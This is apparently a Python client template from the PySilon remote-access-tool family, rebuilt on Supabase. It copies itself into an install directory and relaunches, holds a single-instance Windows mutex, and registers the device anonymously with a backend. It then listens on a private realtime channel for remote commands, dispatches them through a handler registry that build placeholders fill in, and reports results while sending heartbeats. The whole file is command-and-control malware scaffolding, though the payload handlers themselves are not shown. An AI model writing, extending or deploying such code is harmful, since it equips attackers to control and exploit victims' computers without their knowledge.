#<imports>
import asyncio
import inspect
import json
import os
import shutil
import subprocess
import sys
import uuid
from pathlib import Path

import httpx
from supabase import acreate_client
#</imports>
#!feature_imports.indentation=0

CONFIG = json.loads(r"""__CONFIG_JSON__""")
_MUTEX_HANDLE = None


def same_path(left, right):
    try:
        return str(Path(left).resolve()).casefold() == str(Path(right).resolve()).casefold()
    except Exception:
        return False


def ensure_install_location():
    if not getattr(sys, "frozen", False):
        return

    install_dir = str(CONFIG.get("install_dir") or "").strip()
    if not install_dir:
        return

    current_exe = Path(sys.executable).resolve()
    target_dir = Path(install_dir).expanduser()

    try:
        target_dir.mkdir(parents=True, exist_ok=True)
    except Exception as exc:
        print(f"[client] could not create install directory {target_dir}: {exc}")
        return

    target_exe = target_dir / current_exe.name
    if same_path(current_exe, target_exe):
        return

    try:
        shutil.copy2(current_exe, target_exe)
        print(f"[client] installed to {target_exe}")
        subprocess.Popen(
            [str(target_exe)],
            cwd=str(target_dir),
            creationflags=getattr(subprocess, "CREATE_NEW_CONSOLE", 0),
        )
        print("[client] started installed copy; exiting current process.")
        os._exit(0)
    except Exception as exc:
        print(f"[client] self-install failed: {exc}")


def app_dir():
    if getattr(sys, "frozen", False):
        return Path(sys.executable).resolve().parent
    return Path(__file__).resolve().parent


def mutex_name():
    seed = f"{CONFIG.get('install_dir', '')}|{CONFIG.get('executable_name', '')}"
    return f"Local\\PySilon_{uuid.uuid5(uuid.NAMESPACE_URL, seed).hex}"


def acquire_single_instance():
    global _MUTEX_HANDLE

    if sys.platform != "win32":
        return

    import ctypes

    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    handle = kernel32.CreateMutexW(None, False, mutex_name())
    last_error = ctypes.get_last_error()

    if not handle:
        raise ctypes.WinError(last_error)

    if last_error == 183:
        print("[client] another instance is already running; exiting.")
        os._exit(0)

    _MUTEX_HANDLE = handle


ensure_install_location()

BASE_DIR = app_dir()
STATE_DIR = (BASE_DIR / CONFIG.get("state_dir", "./state")).resolve()
STATE_DIR.mkdir(parents=True, exist_ok=True)

acquire_single_instance()

INSTALL_ID_FILE = STATE_DIR / "install_id.txt"
SESSION_FILE = STATE_DIR / "supabase_session.json"


def register_device_function_url():
    return CONFIG["supabase_url"].rstrip("/") + "/functions/v1/register-device"


def get_install_id():
    if INSTALL_ID_FILE.exists():
        install_id = INSTALL_ID_FILE.read_text(encoding="utf-8").strip()
        if install_id:
            return install_id

    install_id = str(uuid.uuid4())
    INSTALL_ID_FILE.write_text(install_id, encoding="utf-8")
    return install_id


def get_display_name(install_id):
    return f"monitor-{install_id[:8]}"


def load_saved_session():
    if not SESSION_FILE.exists():
        return None

    try:
        return json.loads(SESSION_FILE.read_text(encoding="utf-8"))
    except Exception:
        return None


def save_session(access_token, refresh_token):
    SESSION_FILE.write_text(
        json.dumps(
            {
                "access_token": access_token,
                "refresh_token": refresh_token,
            },
            indent=2,
        ),
        encoding="utf-8",
    )


async def authenticate(supabase):
    saved = load_saved_session()

    if saved and saved.get("access_token") and saved.get("refresh_token"):
        try:
            auth = await supabase.auth.set_session(
                saved["access_token"],
                saved["refresh_token"],
            )
            if auth.user and auth.session:
                save_session(auth.session.access_token, auth.session.refresh_token)
                print(f"[client] restored anonymous session for {auth.user.id}")
                return auth
        except Exception as exc:
            print(f"[client] saved session could not be restored: {exc}")

    auth = await supabase.auth.sign_in_anonymously({})
    if auth.user is None or auth.session is None:
        raise RuntimeError("Anonymous Supabase sign-in failed")

    save_session(auth.session.access_token, auth.session.refresh_token)
    print(f"[client] created anonymous session for {auth.user.id}")
    return auth


async def register_device(install_id, display_name, auth):
    async with httpx.AsyncClient(timeout=20) as client:
        response = await client.post(
            register_device_function_url(),
            headers={
                "Authorization": f"Bearer {auth.session.access_token}",
                "apikey": CONFIG["supabase_anon_key"],
            },
            json={
                "install_id": install_id,
                "display_name": display_name,
                "auth_user_id": auth.user.id,
            },
        )
        response.raise_for_status()
        return response.json()


#!handler_defs.indentation=0

COMMAND_HANDLERS = {
#!handler_registry.indentation=0
}


async def run_handler(handler, context, args):
    result = handler(context, args)
    if inspect.isawaitable(result):
        return await result
    return result


async def send_command_error(response_channel, context, request_id, cmd, error):
    await response_channel.send_broadcast(
        "command_error",
        {
            "request_id": request_id,
            "cmd": cmd,
            "device_id": context["device_id"],
            "slot_number": context["slot_number"],
            "display_name": context["display_name"],
            "error": error,
        },
    )


async def main():
    if not CONFIG.get("supabase_url") or not CONFIG.get("supabase_anon_key"):
        raise RuntimeError("Supabase URL and anon key must be configured before building.")

    install_id = get_install_id()
    display_name = get_display_name(install_id)
    supabase = await acreate_client(CONFIG["supabase_url"], CONFIG["supabase_anon_key"])

    auth = await authenticate(supabase)
    await supabase.realtime.set_auth(auth.session.access_token)

    registration = await register_device(install_id, display_name, auth)
    device_id = registration["device_id"]
    slot_number = registration["slot_number"]
    device_topic = registration["device_topic"]
    response_topic = registration["response_topic"]

    context = {
        "install_id": install_id,
        "device_id": device_id,
        "slot_number": slot_number,
        "display_name": display_name,
    }

    response_channel = supabase.channel(
        response_topic,
        {"config": {"private": True}},
    )
    await response_channel.subscribe()

    async def handle_command(payload):
        data = payload.get("payload", {})
        cmd = str(data.get("cmd") or "").strip().lower()
        request_id = data.get("request_id")
        args = data.get("args") or {}

        if not request_id:
            return

        handler = COMMAND_HANDLERS.get(cmd)
        if handler is None:
            await send_command_error(
                response_channel,
                context,
                request_id,
                cmd,
                f"Unsupported command: {cmd}",
            )
            return

        try:
            result = await run_handler(handler, context, args)
        except Exception as exc:
            await send_command_error(
                response_channel,
                context,
                request_id,
                cmd,
                f"{type(exc).__name__}: {exc}",
            )
            return

        await response_channel.send_broadcast(
            "command_result",
            {
                "request_id": request_id,
                "cmd": cmd,
                "device_id": device_id,
                "slot_number": slot_number,
                "display_name": display_name,
                "result": result,
            },
        )

    command_channel = supabase.channel(
        device_topic,
        {"config": {"private": True}},
    )

    def on_command(payload):
        asyncio.create_task(handle_command(payload))

    command_channel.on_broadcast(
        event="command",
        callback=on_command,
    )
    await command_channel.subscribe()

    print(
        f"[client] ready as {display_name} on slot {slot_number}; "
        f"commands: {', '.join(sorted(COMMAND_HANDLERS)) or 'none'}"
    )

    try:
        while True:
            try:
                await supabase.rpc(
                    "touch_device_last_seen",
                    {"p_device_id": device_id},
                ).execute()
            except Exception as exc:
                print(f"[client] heartbeat failed: {exc}")

            await asyncio.sleep(30)
    finally:
        try:
            await supabase.remove_channel(command_channel)
        except Exception:
            pass

        try:
            await supabase.remove_channel(response_channel)
        except Exception:
            pass


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("[client] stopped")
